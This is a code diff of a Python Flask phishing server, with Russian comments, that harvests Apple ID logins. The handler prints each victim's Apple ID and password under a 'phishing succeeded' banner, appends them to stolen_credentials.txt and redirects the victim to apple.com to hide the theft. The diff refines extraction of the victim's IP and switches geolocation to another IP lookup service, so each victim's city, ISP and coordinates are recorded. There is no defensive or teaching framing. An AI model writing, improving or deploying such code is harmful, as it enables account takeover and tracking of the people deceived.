@@ -6,32 +6,30 @@ import json
 app = Flask(__name__)
 
 def get_client_ip():
-    """Максимально точное определение IP"""
+    """Точное получение реального IP жертвы"""
     if request.headers.getlist("X-Forwarded-For"):
-        return request.headers.getlist("X-Forwarded-For")[0]
+        return request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
     elif request.headers.get("X-Real-IP"):
         return request.headers.get("X-Real-IP")
     return request.remote_addr
 
 def get_geolocation(ip):
-    """Геолокация через ip-api.com (более стабильный бесплатный API)"""
+    """Новый API — FreeIPAPI (более стабильный на хостингах)"""
     try:
-        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
-        with urllib.request.urlopen(url, timeout=6) as response:
+        url = f"https://freeipapi.com/api/json/{ip}"
+        with urllib.request.urlopen(url, timeout=8) as response:
             data = json.loads(response.read().decode())
-            if data.get("status") == "success":
-                return {
-                    "city": data.get("city", "Unknown"),
-                    "region": data.get("regionName", "Unknown"),
-                    "country": data.get("country", "Unknown"),
-                    "latitude": data.get("lat"),
-                    "longitude": data.get("lon"),
-                    "timezone": data.get("timezone", "Unknown"),
-                    "isp": data.get("isp", "Unknown"),
-                    "org": data.get("org", "Unknown")
-                }
-            else:
-                return {"error": data.get("message", "Unknown error")}
+            
+            return {
+                "city": data.get("cityName", "Unknown"),
+                "region": data.get("regionName", "Unknown"),
+                "country": data.get("countryName", "Unknown"),
+                "latitude": data.get("latitude"),
+                "longitude": data.get("longitude"),
+                "timezone": data.get("timeZone", "Unknown"),
+                "isp": data.get("isp", "Unknown"),
+                "org": data.get("organization", "Unknown")
+            }
     except Exception as e:
         return {"error": f"API error: {str(e)}"}
 
@@ -49,7 +47,7 @@ def login():
     user_agent = request.headers.get('User-Agent', 'Unknown')
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    print("=" * 85)
+    print("=" * 90)
     print(f"🚨 ФИШИНГ УСПЕШЕН! [{timestamp}]")
     print(f"IP-адрес жертвы     : {ip}")
     print(f"Город               : {geo.get('city', 'Unknown')}")
@@ -61,16 +59,15 @@ def login():
     print(f"Apple ID            : {apple_id}")
     print(f"Пароль              : {password}")
     print(f"User-Agent          : {user_agent}")
-    print("=" * 85)
+    print("=" * 90)
 
     # Сохранение в файл
     with open('stolen_credentials.txt', 'a', encoding='utf-8') as f:
         f.write(f"[{timestamp}] | IP: {ip} | City: {geo.get('city','Unknown')} | Country: {geo.get('country','Unknown')} | "
-                f"Apple ID: {apple_id} | Password: {password} | UA: {user_agent}\n")
+                f"Apple ID: {apple_id} | Password: {password}\n")
 
     return redirect('https://www.apple.com')
 
 if __name__ == '__main__':
-    print("✅ Сервер запущен! http://127.0.0.1:5000")
-    print("   Теперь используется более стабильный API ip-api.com для геолокации")
+    print("✅ Сервер запущен!")
     app.run(debug=True, port=5000)
